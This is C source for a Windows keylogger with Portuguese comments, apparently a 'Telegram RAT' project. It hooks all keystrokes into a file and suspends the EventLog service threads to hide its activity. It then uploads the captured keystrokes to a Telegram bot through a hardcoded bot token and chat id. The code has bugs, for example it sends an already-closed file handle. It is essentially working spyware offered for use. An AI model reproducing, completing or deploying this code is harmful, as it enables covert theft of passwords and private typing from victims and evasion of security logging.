    #include <stdio.h>
    #include <stdlib.h>
    #include <windows.h>
    #include <wininet.h>
    #include <Psapi.h>
    #include <TlHelp32.h>
    #include <dbghelp.h>
    #include <winternl.h>
       typedef       NTSTATUS(NTAPI *myNtQueryInformationThread )(
    	IN HANDLE          ThreadHandle,
    	IN THREADINFOCLASS ThreadInformationClass,
    	OUT PVOID          ThreadInformation,
    	IN ULONG           ThreadInformationLength,
    	OUT PULONG         ReturnLength
    	);
            typedef struct Key_logger{
            HANDLE th;
            FILE *fp;
    
    
    
            }Key_logger;
            DWORD WINAPI loop_temporal(void ){
           HANDLE serviceProcessHandle;
    	HANDLE snapshotHandle;
    	HANDLE threadHandle;
    
    	HMODULE modules[256] = {};
    	SIZE_T modulesSize = sizeof(modules);
    	DWORD modulesSizeNeeded = 0;
    	DWORD moduleNameSize = 0;
    	SIZE_T modulesCount = 0;
    	WCHAR remoteModuleName[128] = {0};
    	HMODULE serviceModule = NULL;
    	MODULEINFO serviceModuleInfo = {0};
    	DWORD_PTR threadStartAddress = 0;
    	DWORD bytesNeeded = 0;
    
    myNtQueryInformationThread NtQueryInformationThread=(myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread"));
    
    	THREADENTRY32 threadEntry;
    	threadEntry.dwSize = sizeof(THREADENTRY32);
    
    	SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
    	SC_HANDLE service = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);
    
    	SERVICE_STATUS_PROCESS serviceStatusProcess = {};
    
    
    	QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded);
    	DWORD servicePID = serviceStatusProcess.dwProcessId;
    
    
    	serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);
    	snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    
    
    	EnumProcessModules(serviceProcessHandle, modules, modulesSize, &modulesSizeNeeded);
    	modulesCount = modulesSizeNeeded / sizeof(HMODULE);
    	for (size_t i = 0; i < modulesCount; i++)
    	{
    		serviceModule = modules[i];
    
    
    		GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName));
    
    		if (wcscmp(remoteModuleName, L"wevtsvc.dll") == 0)
    		{
    			printf("Windows EventLog module %S at %p\n\n", remoteModuleName, serviceModule);
    			GetModuleInformation(serviceProcessHandle, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO));
    		}
    	}
    
    
    	Thread32First(snapshotHandle, &threadEntry);
    	while (Thread32Next(snapshotHandle, &threadEntry))
    	{
    		if (threadEntry.th32OwnerProcessID == servicePID)
    		{
    			threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);
    			NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);
    
    
    			if (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)
    			{
    				printf("Suspending EventLog thread %d with start address %p\n", threadEntry.th32ThreadID, threadStartAddress);
    
    
    				SuspendThread(threadHandle);
    				Sleep(2000);
    			}
    		}
    	}
    
    
    
    
    
            }//definimos um loop baseado em tempo esse loop determina quanto tempo nosso keylloger irar gravar as teclas
            void Persistence();
            void telegram_send_file(FILE *fp){
                    const char *token="6328567938:AAFScH10hlOHkKymIU_cNaTs93AHQlB7X_I";;
    
                    const char *chat_id="-1001788655910";
                    HINTERNET hinternet;
                    HINTERNET connect;
                    char boundary[]= "---------------------------14737809831466499882746641449";
                    char header[1024];
                    char data_post[4096];
                    DWORD len_data_post;
                    char response_buffer[1024];
                    DWORD bytes_id;
                    char URL[1024];
                //	fp=fopen("C:\\Users\\estan\\OneDrive\\Área de Trabalho\\t\\t.cbp\\Telegram RAT\\keylloger.txt", "a+");
                     fseek(fp, 0, SEEK_END);
                     int fe_size=ftell(fp);
                     rewind(fp);
                     char *file_buffer=(char*)malloc(fe_size+1);
                     fread(file_buffer, 1, fe_size, fp);
                     file_buffer[fe_size]='\0';
                    snprintf(URL, sizeof(URL), "https://api.telegram.org/bot%s/sendDocument?chat_id=%s", token, chat_id);
                    hinternet=InternetOpen("winnet", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
                     connect = InternetOpenUrl(hinternet, URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
                      snprintf(header, sizeof(header), "Content-Type: multipart/form-data; boundary=%s", boundary);
                       len_data_post = snprintf(data_post, sizeof(data_post), "--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"seuarquivo.txt\"\r\nContent-Type: text/plain\r\n\r\n", boundary);
    
                 memcpy(data_post + len_data_post, file_buffer, fe_size);
                 len_data_post+=fe_size;
                   len_data_post += snprintf(data_post + len_data_post, sizeof(data_post) - len_data_post, "\r\n--%s--\r\n", boundary);
                    HttpSendRequest(connect, header, strlen(header), data_post, len_data_post);
                     InternetReadFile(connect, response_buffer, sizeof(response_buffer), &bytes_id);
                      response_buffer[bytes_id] = '\0';
                       InternetCloseHandle(connect);
                      InternetCloseHandle(hinternet);
                      free(file_buffer);
    
    
    
    
                    }//essa  e nossa funçao de requiçao temos o chat id voce precisaa de um grupo de telegram e  colocar seu bot coloque seu token e  chat id
            FILE *log;
    
             LRESULT CALLBACK hook(int codigo, WPARAM c, LPARAM
    
                    d)
    
                {
    
    
    
                    if (codigo == HC_ACTION)
    
                    {
    
                        switch (c)
    
                        {
    
                            case WM_KEYDOWN:
    
                            case WM_SYSKEYDOWN:
    
                           // case WM_KEYUP:
    
                            case WM_SYSKEYUP:
    
                                {
    
                                    PKBDLLHOOKSTRUCT m = (PKBDLLHOOKSTRUCT) d;
    
                                    fprintf(log,"%c", m->vkCode);
    
                                    break;
    
                                }
    
                        }
    
                    }
    
                    return( CallNextHookEx(NULL, codigo, c,
    
                        d));
    
                }
    
    
                void loopmessage(){
                    MSG  msg;
                    BOOL bRet;
                    GetMessage( &msg, NULL, 0, 0 );
                   while( (bRet = GetMessage( &msg, NULL, 0, 0 )) != 0)
                {
                    if (bRet == -1)
                    {
                        // handle the error and possibly exit
                    }
                    else
                    {
                        TranslateMessage(&msg);
                        DispatchMessage(&msg);
                    }
                }
    
    
                }
                DWORD WINAPI hook_injection(){
                HINSTANCE  i=GetModuleHandle(NULL);  //recupera um um indentificador para uma janela
                HHOOK k =SetWindowsHookEx(WH_KEYBOARD_LL,hook,i,0);//Funçao de gancho para uma janela qualquer que recupera o estado das teclas digitadas
                loopmessage();// loop de mensagens
                UnhookWindowsHookEx(k);
                return 0;
                }
    
    
        typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    
                    int main(){
            Key_logger key_struct;
    
    
    
    
                    log=fopen("key.txt","a+");
    
                    HANDLE temp;
    
            DWORD w,s;
                      HANDLE l=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)hook_injection,NULL,0,&w);
                      key_struct.fp=log;
                    key_struct.th=l;
                      temp=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)loop_temporal,&key_struct,0,&s);
                    time_t secs = 20; // 2 minutes (can be retrieved from user's input)
        int d;
            time_t startTime = time(NULL);
            while (time(NULL) - startTime < secs)
            {
    
            }
            fclose(log);
            FILE *f;
            TerminateThread(l,2);
    
                      f=fopen("key.txt","rb");
                      telegram_send_file(log);
    
    
                if(l){
                    return WaitForSingleObject(l,INFINITE);
    
                }
                else{
                fclose(log);
                    return 1;
                }
    //Referencias:https://www.ired.team/offensive-security/defense-evasion/disabling-windows-event-logs-by-suspending-eventlog-service-threads
                        //
    
    
                    }
